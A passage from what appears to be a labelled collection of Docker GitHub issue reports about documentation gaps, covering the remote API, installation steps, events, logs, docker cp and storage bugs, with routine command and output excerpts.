/exec/f33bbfb39f5b142420f4759b2348913bd4a8d1a6d7fd56499cb41a1bb91d7b3b/json HTTP/1.1\n> Host: 192.168.212.133:2376\n> User-Agent: curl/7.43.0\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Server: Docker/1.10.3 (linux)\n< Date: Tue, 29 Mar 2016 19:47:24 GMT\n< Content-Length: 379\n<\n{\"ID\":\"f33bbfb39f5b142420f4759b2348913bd4a8d1a6d7fd56499cb41a1bb91d7b3b\",\"Running\":false,\"ExitCode\":2,\"ProcessConfig\":{\"tty\":true,\"entrypoint\":\"sh\",\"arguments\":[\"-c\",\"exit 2\"],\"privileged\":false,\"user\":\"1000\"},\"OpenStdin\":true,\"OpenStderr\":true,\"OpenStdout\":true,\"CanRemove\":false,\"ContainerID\":\"b53ee82b53a40c7dca428523e34f741f3abc51d9f297a14ff874bf761b995126\",\"DetachKeys\":\"\"}\n```\n\n**Describe the results you received:**\nThere's only a `ContainerID` instead of the entire `Container` object as stated in the docs here https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.22.md#exec-inspect.\n\n**Describe the results you expected:**\nThe docs should correspond to the behavior.\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":[null,"documentation"],"text":"Every part of the remote API that returns a collection of objects (`GET /images/json`, `GET /containers/json`, `GET /events`, etc.) returns its values as a JSON list of objects: `[{...}, {...}, ...]`. Every part, that is, except `GET /volumes`. That endpoint returns an object of one element whose value is a list: `{ \"Volumes\": [{...}, {...}, ...] }`. This is still the case in the [most recent dev Remote API Docs](https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.24.md#list-volumes).\n\nIs there a reason `GET /volumes` is inconsistent with the rest of the API? If there is no reason, I ask that it be made to return a flat list.\n"},{"labels":["documentation"],"text":"Just like https://docs.docker.com/compose/completion/, it would be useful to have https://docs.docker.com/engine/completion/\n\nThis is already answered at:\n\nhttp://stackoverflow.com/questions/26132451/how-to-add-bash-command-completion-for-docker-on-mac-os-x\n"},{"labels":["documentation"],"text":"Broken links at: https://docs.docker.com/docker-hub/overview/\n\nWebhooks link to https://docs.docker.com/docker-hub/builds/#webhooks instead of https://docs.docker.com/docker-hub/webhooks/.\n"},{"labels":["documentation",null,null],"text":"Loving the new seccomp BPF stuff; thanks for making it more \"within reach\" for typical users.\n\n[I wrote a little thing to allow ptrace in my containers](https://blog.afoolishmanifesto.com/posts/how-to-enable-ptrace-in-docker-1.10/) and while it worked I started getting these warnings:\n\n```\n2016/03/21 22:05:18 Error resolving syscall name copy_file_range: could not resolve name to syscall - ignoring syscall.\n2016/03/21 22:05:18 Error resolving syscall name mlock2: could not resolve name to syscall - ignoring syscall.\n```\n\nNot a huge deal, but I figured out I would go ahead and automate the exclusion of system calls that are \"unknown.\"  After scripting that there were five other system calls that were excluded:\n1. recv - this is, as far as I understand the exact same as recvfrom, seems safe to leave out\n2. send - same as recv, but sendto\n3. cacheflush - this is for a non-x86 arch (MIPS) which I'd be surprised if Go even worked on, but either way also seems safe (for me, but maybe not docker proper) to leave out\n4. breakpoint - I have no manpage for this; perhaps it is the same as 3 but undocumented?\n5. set_tls - same situation as 4.\n\nHonestly I am not super sure where to go from here.  Some documentation on why all of these are included might be nice.  The weirder thing to me was that I got a warning for mlock2 and copy_file_range but not cacheflush, breakpoint, and set_tls.\n\nSorry to have such a vague report, but I figured more information can't hurt.\n"},{"labels":["documentation"],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.10.3\n API version:  1.22\n Go version:   go1.6\n Git commit:   20f81dd\n Built:        Sat Mar 12 04:07:44 UTC 2016\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      1.10.3\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   20f81dd\n Built:        Thu Mar 10 21:49:11 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 1\nServer Version: 1.10.3\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 2\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins:\n Volume: local\n Network: bridge null host\nKernel Version: 4.1.19-boot2docker\nOperating System: Boot2Docker 1.10.3 (TCL 6.4.1); master : 625117e - Thu Mar 10 22:09:02 UTC 2016\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 996.1 MiB\nName: 1.10\nID: XS37:USGK:BVPL:4KKK:K6HN:EMVM:43DG:W2CY:JFO3:I6KX:OITN:E5F2\nDebug mode (server): true\n File Descriptors: 10\n Goroutines: 21\n System Time: 2016-03-19T01:28:14.590797867Z\n EventsListeners: 0\n Init SHA1:\n Init Path: /usr/local/bin/docker\n Docker Root Dir: /mnt/sda1/var/lib/docker\nLabels:\n provider=virtualbox\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nVirtualBox\n\n**Steps to reproduce the issue:**\n1. Look up remote API docs to create a container (for example, [API version 1.22](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.22/#create-a-container)).\n2. Issue a `curl` call to create a container with mounts.\n\n```\n$ curl -XPOST -H 'Content-Type: application/json' http://${docker}/containers/create?name=foo -d '{\"Image\": \"busybox\", \"Mounts\": [{ \"Destination\": \"/foo\" }]}'\n```\n1. Inspect the container. See that no `Mounts` were created.\n\n```\n$ curl http://${docker}/containers/foo/json | jq '.Mounts'\n[]\n```\n1. Ignore the docs, search on the issues, find #15908, specifically [this comment](https://github.com/docker/docker/issues/15908#issuecomment-137749134).\n2. Create a container using the undocumented `Volumes` key.\n\n```\n$ curl -XPOST -H 'Content-Type: application/json' http://${docker}/containers/create?name=foo -d '{\"Image\": \"busybox\", \"Volumes\": { \"/foo\": {}}}'\n```\n1. Inspect the container. See that `Mounts` were created.\n\n```\n$ curl http://${docker}/containers/foo/json | jq '.Mounts'\n[  \n    {\n        \"Name\": \"ee6a4252b747356d74e71c952401420af00dbfc704b9d560000dec0df5ea095b\",\n        \"Source\": \"/mnt/sda1/var/lib/docker/volumes/ee6a4252b747356d74e71c952401420af00dbfc704b9d560000dec0df5ea095b/_data\",\n        \"Destination\": \"/foo\",\n        \"Driver\": \"local\",\n        \"Mode\": \"\",\n        \"RW\": true,\n        \"Propagation\": \"\"\n    }\n]\n```\n\n**Describe the results you received:**\nRemote API docs describe an incorrect way to create a container with volumes. And the correct way is inconsistent in that the deprecated `\"Volumes\"` key must be used to create containers with volumes, but the newer `\"Mounts\"` key is used to deliver information on a container inspect.\n\n**Describe the results you expected:**\nEither the Remote API docs would correctly describe how to create a container with volumes, or the actual API would be fixed to be consistent between creating/inspecting.\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nThe example in the docs is incorrect in every version going back to when the `Mounts` key was introduced in API 1.20.\n"},{"labels":["documentation",null,null],"text":"For Docker 1.11, containerd integration (https://github.com/docker/docker/pull/20662)\nonly brings a minimum amount of user-facing changes.\n\nThere _are_ some changes that need to be documented. This is a first inventory\nof those changes (more changes may follow).\n## ~~Installation from binaries~~\n\n~~Docker Engine no longer is a single binary, and requires 4 binaries to run;\n(docker, containerd, containerd-shim, runc).~~\n\n~~We need to update the \"installation from binaries\" documentation;\nhttps://docs.docker.com/engine/installation/binaries/~~\n\naddressed in https://github.com/docker/docker/pull/21994\n## ~~New daemon flag~~\n\nThere is a new `--containerd=` option in the daemon that needs to be documented;\n- https://github.com/docker/docker/blob/master/docs/reference/commandline/daemon.md\n- https://github.com/docker/docker/blob/master/man/docker-daemon.8.md\n\nThis was resolved in https://github.com/docker/docker/pull/21576\n## ~~Changes in \"privileged\" containers~~\n\n~~There is a change with `--privileged` and restricted readonly paths. In docker 1.10\nthere are no restrictions, in 1.11 restrictions are applied but because the user is\nprivileged they can revert them inside container.~~\n\nFor reference; https://github.com/docker/docker/blob/e6573a5d18c3045fb021668f3c7539ffa52696fe/daemon/execdriver/native/template/default_template_linux.go#L86-L98\n\n(resolved by https://github.com/docker/docker/pull/21751)\n## ~~Systemd groups~~\n\n~~This is still being worked on, but there's a chance that systemd cgroups won't\nwork in the initial release, so `--exec-opt native.cgroupdriver=systemd` cannot \nbe used.~~\n\n~~If systemd cgroups are not supported, this should be documented. ~~\n\n(resolved in https://github.com/docker/docker/pull/21592)\n## Experimental features\n\nSlight user facing change is that in case of a daemon crash, containers will\nnot die but we will still shut them down on start. In experimental we will\nleave them running and reattach upon daemon start.\n\n(currently blocked on https://github.com/docker/docker/issues/21933, we can add documentation\nfor the experimental features once those are resolved)\n## ~~Controlling the containerd daemon~~\n\n~~t.b.d.; the docker daemon automatically takes care of starting/stopping the\ncontainerd daemon. Do we need to describe how to start/stop (and configure?) \nthe containerd daemon manually?~~\n\nno changes needed for the regular installation, and binary installation is\nupdated in https://github.com/docker/docker/pull/21994\n## Overview of binaries and their role\n\nt.b.d.; provide an overview of the binaries that are installed, and what their\nrole is.\n## Packagers documentation\n\nhttps://github.com/docker/docker/blob/master/project/PACKAGERS.md\n## Contributors guide\n\nhttps://github.com/docker/opensource/tree/master/docs\n"},{"labels":["documentation",null],"text":"Hello,\n\nIt looks like the documentation for [events](https://docs.docker.com/engine/reference/api/docker_remote_api/#docker-events) has become out of date, in particular around the `kill` event.  Prior to Docker 1.7.0, the `kill` event was only emitted on `SIGKILL` being sent to the container via `docker kill`.  Since 1.7.0, the semantic changed and the `kill` event started to be emitted on any signal sent via `docker kill`, and since 1.8.0 the semantic changed again and the `kill` event started to be emitted for any signal sent at all (including `SIGTERM` and `SIGKILL` sent as part of `docker stop`).  These changes in behavior led to a [bug](https://github.com/aws/amazon-ecs-agent/issues/335) with the Amazon ECS Agent, which we will be correcting with our next release.\n\nHere's the set of behavior changes I've found across different Docker versions:\n\n| Docker version | `docker kill -s USR1` | `docker kill` | `docker stop` | Container exit |\n| --- | --- | --- | --- | --- |\n| 1.5.0 | no event | `die`, `kill` | `die`, `stop` | `die` |\n| 1.6.0 | no event | `die`, `kill` | `die`, `stop` | `die` |\n| 1.6.1 | no event | `die`, `kill` | `die`, `stop` | `die` |\n| 1.6.2 | no event | `die`, `kill` | `die`, `stop` | `die` |\n| 1.7.0 | `kill` | `die`, `kill` | `die`, `stop` | `die` |\n| 1.7.1 | `kill` | `die`, `kill` | `die`, `stop` | `die` |\n| 1.8.0 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.8.1 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.8.2 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.8.3 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.9.0 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.9.1 | `kill` | `kill`, `die` | `kill`, `kill`, `die`, `stop` | `die` |\n| 1.10.0 | `kill`* | `kill`, `die`* | `kill`, `kill`, `die`, `stop`* | `die`* |\n| 1.10.1 | `kill`* | `kill`, `die`* | `kill`, `kill`, `die`, `stop`* | `die`* |\n| 1.10.2 | `kill`* | `kill`, `die`* | `kill`, `kill`, `die`, `stop`* | `die`* |\n| 1.10.3 | `kill`* | `kill`, `die`* | `kill`, `kill`, `die`, `stop`* | `die`* |\n\n\\* These events are now typed with `container`.  Other events are emitted with type `network` and `volume`.\n\nNote that `kill` is emitted under many more circumstances in recent versions of Docker, and that the ordering of `die`, `kill` changed to `kill`, `die` with Docker 1.8.0 as well.  The [available](https://docs.docker.com/engine/reference/commandline/events/) [documentation](https://docs.docker.com/engine/reference/api/docker_remote_api/#docker-events) for events is fairly light as a whole, but the [event diagram](https://docs.docker.com/engine/reference/api/images/event_state.png) has been out of date at least since 1.7.0.\n\nIt would be fantastic if the semantics of the different events were documented and any semantic changes were called out in the changelog for releases.\n\nThanks!\nSam\n"},{"labels":["documentation",null,null,null],"text":"Is there anything similar to the flowcharts on https://docs.docker.com/engine/extend/authorization/ for the volume plugin API?\n\nI am trying to write a simple volume plugin for some internal use cases and it would be nice to see a visual of what requests will be called for the relevant CLI/API commands.\n\nFor instance the first time I started testing my plugin I was surprised by the number of Path requests before/after other operations. Based on the documentation I assumed it would have only been used with docker inspect type commands.\n"},{"labels":["documentation",null],"text":"I've gone through a few Docker installs on Ubuntu both myself as well as with some new developers on my team.  I've noticed a fairly consistent series of missed steps or mistakes that keep happening during each setup.  This is not because the document is incomplete, but because the necessary steps are spread out and hidden amongst other **optional** steps.\n\nhttps://github.com/docker/docker/blob/master/docs/installation/linux/ubuntulinux.md\n\nIt would be nice if the following steps were put at the top of the instructions and noted as a \"typical\" flow for installation:\n\n---\n1. Add the new `GPG` key.\n   \n   ```\n   sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\n   ```\n2. Add an entry for your Ubuntu operating system to `/etc/apt/sources.list.d/docker.list`\n   - On Ubuntu Precise 12.04 (LTS)\n         `deb https://apt.dockerproject.org/repo ubuntu-precise main`\n   - On Ubuntu Trusty 14.04 (LTS)\n         `deb https://apt.dockerproject.org/repo ubuntu-trusty main`\n   - Ubuntu Wily 15.10\n         `deb https://apt.dockerproject.org/repo ubuntu-wily main`\n   - Ubuntu Wily 16.04\n         `deb https://apt.dockerproject.org/repo ubuntu-xenial main`\n3. Update the `APT` package index.\n   \n   ```\n   sudo apt-get update\n   ```\n4. Install Docker\n   \n   ```\n   sudo apt-get install docker-engine\n   ```\n5. Add your user to the `docker` group\n   \n   ```\n   sudo usermod -aG docker ubuntu\n   ```\n   ---\n\nThis series of steps is sufficient for the majority of the installations that happen.  While it's fine to keep the extended information - as it's helpful - burying the important parts has required me to assist every person I've instructed to install docker.\n\nIt's worth noting I think given the number of steps needed to install the Ubuntu package, would it not make sense for Docker to publish an official PPA?  Much of this would be mitigated by just doing that.\n"},{"labels":["documentation",null,null],"text":"> Whenever possible, use current Official Repositories as the basis for your image. We recommend the Debian image since it’s very tightly controlled and kept extremely minimal (currently under 100 mb), while still being a full distribution.\n\nThe docs suggest that the Debian image is under 100 mb. While this may have been true at some time point in the past, it's incorrect at present. https://github.com/docker-library/docs/blob/master/debian/tag-details.md#debianlatest suggests that the size is around 125 mb now - for latest and jessie.\n"},{"labels":["documentation"],"text":"I am trying to follow this guide https://docs.docker.com/engine/security/certificates/, but the paths are for linux. What would be the equivalent for Windows?\n"},{"labels":["documentation"],"text":"After #19953 closes, the volume documentation should be updated to account for the changes wherever we talk about anonymous volumes.\n"},{"labels":["documentation"],"text":"Create overview/parent pages for the engine sub commands `docker-volume` and `docker-network`.  Needed and necessary in the `/man` and `/docs` directory.  See #20190 \n"},{"labels":["documentation"],"text":"Reported by @jpetazzo\n\nIf I pass an invalid sequence --detach-keys just accepts it without showing an error (and silently reverts to `^P^Q`) also, I don't think that `[a-Z]` is a valid glob entry. I'm not sure exactly what the doc should say since I don't know what the code should do; but it needs more explanation IMHO For example:\n\n`--detach-keys ctrl-d,d` \n\nworks, but not \n\n`ctrl-D,d` or `CTRL-d,d`\n\nThere is one confusing thing -- the `--detach-keys` can be a global engine option, but when it is used for `docker run` or `docker attach` it is a local, non-sticky option (i.e. if I docker run `--detach-keys ctrl-x` then detach then reattach, it default to `^P^Q` again)\n"},{"labels":["documentation",null,null],"text":"This is with reference to https://github.com/docker/docker/issues/20827. But, that thread is already closed and is not getting traction. Can we open that thread or discuss the issue here?\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nOutput of `docker version`:\n\n```\nDocker version 1.8.0, build 0d03096\n```\n\nOutput of `docker info`:\n\n```\nContainers: 1\nImages: 5\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 21\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.1.18-boot2docker\nOperating System: Boot2Docker 1.10.2 (TCL 6.4.1); master : 611be10 - Mon Feb 22 22:47:06 UTC 2016\nCPUs: 8\nTotal Memory: 1.955 GiB\nName: boot2docker\nID: PVUD:7SAK:UKCM:SWAM:VO4D:HAVW:WJWE:L7J6:OKOY:EHOE:EOMP:ED3Y\nDebug mode (server): true\nFile Descriptors: 11\nGoroutines: 29\nSystem Time: 2016-03-03T17:42:38.217741179Z\nEventsListeners: 0\nInit SHA1: \nInit Path: /usr/local/bin/docker\nDocker Root Dir: /mnt/sda1/var/lib/docker\n```\n\nProvide additional environment details (AWS, VirtualBox, physical, etc.):\nMacOS X\n\nList the steps to reproduce the issue:\n1. Create a docker image with a file at `/app/build/version.txt`\n2. Start a container for that image with\n`CONTAINER_ID=$(docker create foo:123)`\n3. Attempt to copy the file out of the container to a path that doesn't exist with\n`docker cp ${CONTAINER_ID}:/app/build/version.txt build/version.txt`\n--> `lstat /path/to/working/directory/build: no such file or directory`\n4. Try again with just a destination directory with\n`docker cp ${CONTAINER_ID}:/app/build/version.txt build/`\n--> `no such directory`\n5. Create the directory with\n`mkdir build`\n6. Try again with either command.\n--> Notice success.\n\nDescribe the results you received:\n\n`no such file or directory`\n`no such directory`\n\nDescribe the results you expected:\n\nSuccessful copy of the file.\n\nProvide additional info you think is important:\nThe documentation [here](https://docs.docker.com/engine/reference/commandline/cp/) is very explicit about the expected behavior in this situation.  In particular, `SRC_PATH` specifies a file and `DEST_PATH` does not exist, so the file should be created at `DEST_PATH`.  The documentation implies that the directory structure leading up to `DEST_PATH` will be created if necessary.\n"},{"labels":["documentation",null],"text":"I have a local Ubuntu 12.04 machine that I want to run Docker on with some application code. However the code needs to read data off of a USB drive when it is plugged in. Because the drive can be swapped, it seems like volume mounting it does not work when the new one is plugged in. Is there a way to configure Docker so that the usb detection is passed to Docker instead of just the host os? \n\nUse docker run command and discussed here:\n\nhttps://docs.docker.com/engine/reference/run/#volume-shared-filesystems\n\nYou can mount /dev using the -v flag.  Any device that appears on /dev will show up in the container.  If you do this, you'll likely also want to change the cgroup value to restrict the permissions to just the USB device.\n\nJerome in our company also wrote this blog on doing this:\n\nhttps://jpetazzo.github.io/2015/01/13/docker-mount-dynamic-volumes/\n"},{"labels":[null,"documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nOutput of `docker version`:\n\n```\nClient:\n Version:      1.10.2\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   c3959b1\n Built:        Mon Feb 22 16:22:08 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.10.2\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   c3959b1\n Built:        Mon Feb 22 16:22:08 2016\n OS/Arch:      linux/amd64\n```\n\nOutput of `docker info`:\n\n```\nContainers: 24\n Running: 2\n Paused: 0\n Stopped: 22\nImages: 308\nServer Version: 1.10.2\nStorage Driver: devicemapper\n Pool Name: docker-253:2-413393-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: ext4\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 10.48 GB\n Data Space Total: 107.4 GB\n Data Space Available: 26.63 GB\n Metadata Space Used: 15.14 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.132 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Either use `--storage-opt dm.thinpooldev` or use `--storage-opt dm.no_warn_on_loop_devices=true` to suppress this warning.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.93 (2015-01-30)\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins: \n Volume: local\n Network: host bridge null\nKernel Version: 4.3.4-200.fc22.x86_64\nOperating System: Fedora 22 (Twenty Two)\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 7.721 GiB\nName: tomas-dohnalek.brno.seznam.cz\nID: L3SZ:VAVV:WVWH:K37D:QTXP:A3QC:J3LU:OANJ:25A7:J2AR:OYHA:RWEF\nUsername: dohnto\nRegistry: https://index.docker.io/v1/\n```\n\nList the steps to reproduce the issue:\n1. Follow the documentation: (https://docs.docker.com/engine/reference/commandline/pull/ - `docker pull registry.hub.docker.com/debian` or https://github.com/docker/docker/blob/master/man/docker-pull.1.md - `docker pull registry.hub.docker.com/fedora:20`)\n2. Run `docker pull registry.hub.docker.com/debian`\n\nDescribe the results you received:\nThe actual output is  `Error response from daemon: Error parsing HTTP response: invalid character '<' looking for beginning of value: \"\\n\\n\\n<!DOCTYPE html><!....404: The page you were looking for is not here...`\n\nDescribe the results you expected:\nPull the image\n\nProvide additional info you think is important:\n**When I use docker 1.9.1 everything works as expected.**\n"},{"labels":["documentation",null,null,null],"text":"After adding the apt repository according to https://docs.docker.com/engine/installation/linux/ubuntulinux/ instructions, it fails to fetch Docker. There is nothing in the documentation to suggest that ppc64le is not supported in this setup.\n\nW: Failed to fetch https://apt.dockerproject.org/repo/dists/ubuntu-wily/Release  Unable to find expected entry 'main/binary-ppc64el/Packages' in Release file (Wrong sources.list entry or malformed file)\n\nE: Some index files failed to download. They have been ignored, or old ones used instead.\n"},{"labels":[null,"documentation",null,null,null],"text":"When I tried running `docker build --tag Trevor:FlaskCompose`, I received an exception:\n\n> invalid value \"Trevor:FlaskCompose\" for flag --tag: Error parsing reference: \"Trevor:FlaskCompose\" is not a valid repository/tag\n> See 'docker build --help'.\n\nUnfortunately, when running `docker build --help`, as suggested by the tool, there is no additional guidance provided.\n\n> -t, --tag=[]                    Name and optionally a tag in the 'name:tag' format\n\nHow does a user know what a valid \"tag\" is? I fiddled with the name, and apparently the `name` must be all lowercase, and the `tag` portion can have capital letters. However, I am not aware of what the other requirements are.\n\nThe less friction, and more clarity, that is provided by Docker, the more likely users will be to adopt it and be delighted by the experience of working with it. :smile: \n\nCheers,\nTrevor Sullivan\nMicrosoft MVP: PowerShell\n"},{"labels":["documentation",null,null],"text":"https://bugzilla.redhat.com/show_bug.cgi?id=1304808\n\nOutput of `docker version`:\nClient:\n Version:      1.8.2-el7\n API version:  1.20\n Package Version: docker-1.8.2-10.el7.x86_64\n Go version:   go1.4.2\n Git commit:   a01dc02/1.8.2\n Built:  \n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.8.2-el7\n API version:  1.20\n Package Version: \n Go version:   go1.4.2\n Git commit:   a01dc02/1.8.2\n Built:  \n OS/Arch:      linux/amd64\n\nList the steps to reproduce the issue:\n1. docker images --all | tail -n +1 | wc -l\n2. docker info | grep 'Images'\n\nProvide additional info you think is important:\nDiscussions around this issue:\n\n---\n\nWhen you do `docker info` SystemInfo (https://github.com/docker/docker/blob/master/daemon/info.go#L26) method is called, which gets the images count from imageStore.\n\ndaemon.imageStore.Map()\nhttps://github.com/docker/docker/blob/master/daemon/info.go#L72\n\nThis map returns information about the images. (Tags are not part of this store).\nHence when you do `docker images --all|wc -l` you see a different count as tags are also included in the output.\n\nHope that clears up the confusion.\n\nShishir\n\n---\n\nFROM: Chris Evich\nOkay, just checked.  The man-page for 'docker info' is in need of some love.  Clarifying the 'Images' and 'Containers' count with what they actually represent would be 'nice to have'.  On F22, it has this blurb:\n\nThis  command  displays  system  wide information regarding the Docker installation. Information displayed includes the number of containers and images, pool name,  data file,  metadata file, data space used, total data space, metadata space used , total metadata space, execution driver, and the kernel version.\n\nand the example section is really out of date (OS: Ubuntu 14 and Kernel 3.13).  Would make the guys in marketing happier if it showed Fedora/CentOS/RHEL instead and maybe showed the typical devicemapper details instead of aufs (not used any more, anywhere IIRC).\n\nHere's a suggestion for the description blurb:\n\nThis  command  displays  system  wide information regarding the Docker installation. Information displayed includes the number of containers and (non-tagged) images, pool name,  image storage details, space available and used, execution driver, OS and the kernel versions.\n\n---\n"},{"labels":["documentation",null,null],"text":"The docker remote API documentation pages (f.ex. [Remote API v.1.22](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.22/#get-container-logs)) describe how to connect and retrieve container logs, but does not describe _how_ the log messages are formatted. I expect to be able to understand what to do with the data I get back.\n\nFrom what I am able to tell, the log results is a sequence of chunks (I am unsure if these are separated by newline or not, but this seems to be the case). Each chunk seems to be on the format (`fd`, `chunk length`, `contents`). `fd` is a single (1) byte telling you from which file descriptor (1 for stdout, and 2 for stderr) the chunk is from. Next follows `chunk length`, which is 7 bytes telling you how long the length of the log chunk. The length does not include the `fd` field or the `chunk lenght` fields, only the contents. Finally, the contents follow.\n\nThis is, however, a result of look-and-guess based only on enabling stdin and stderr. I have no clue what would happen if I enable timestamps, if I only read data from a single source, or if I even use the right terminology here.\n\nIt would be much easier to use logs fetched via the remote API if this is properly documented.\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nOutput of `docker version`:\n\n```\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5/1.9.1\n Built:        \n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5/1.9.1\n Built:        \n OS/Arch:      linux/amd64\n\n```\n\nOutput of `docker info` (on a fresh host; an affected host does not respond to `docker info`):\n\n```\nContainers: 1\nImages: 6\nServer Version: 1.9.1\nStorage Driver: devicemapper\n Pool Name: docker-docker--pool\n Pool Blocksize: 524.3 kB\n Base Device Size: 107.4 GB\n Backing Filesystem: xfs\n Data file: \n Metadata file: \n Data Space Used: 100.7 MB\n Data Space Total: 9.437 GB\n Data Space Available: 9.337 GB\n Metadata Space Used: 77.82 kB\n Metadata Space Total: 25.17 MB\n Metadata Space Available: 25.09 MB\n Udev Sync Supported: true\n Deferred Removal Enabled: true\n Deferred Deletion Enabled: true\n Deferred Deleted Device Count: 0\n Library Version: 1.02.93-RHEL7 (2015-01-28)\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.1.17-22.30.amzn1.x86_64\nOperating System: Amazon Linux AMI 2015.09\nCPUs: 1\nTotal Memory: 995.6 MiB\nName: ip-172-31-34-29\nID: GO67:QAUR:ZN7D:LBC6:M366:GT2C:BQTV:F3UE:IMGD:YFNF:T37L:OQWC\n\n```\n\nProvide additional environment details (AWS, VirtualBox, physical, etc.): Amazon Linux AMI 2015.09.2 configured with a second EBS volume at /dev/xvdb and configured with direct LVM (using devicemapper) by `docker-storage-setup`.  By default, `docker-storage-setup` configures the thin pool originally sized at 40% of the available disk with an auto-extend policy, however the same behavior is exhibited when auto-extend is disabled and when `lv_when_full` is changed to `error`.\n\nList the steps to reproduce the issue:\n1. Configure Docker as described above (direct LVM with devicemapper using xfs)\n2. Run containers to progressively consume disk (I seemed to have reasonable results using `docker run ubuntu dd if=/dev/urandom of=sample.txt bs=64M count=1 iflag=fullblock`) until the disk is full (alternately, run my [repro script](https://gist.github.com/samuelkarp/6c8b5ebc0a9cc34006c8))\n3. Try to do something with Docker (any of `docker ps`, `docker info`, `docker run`, `docker stop`, `docker rm`, `docker images`, `docker rmi`)\n\nDescribe the results you received:\nDocker 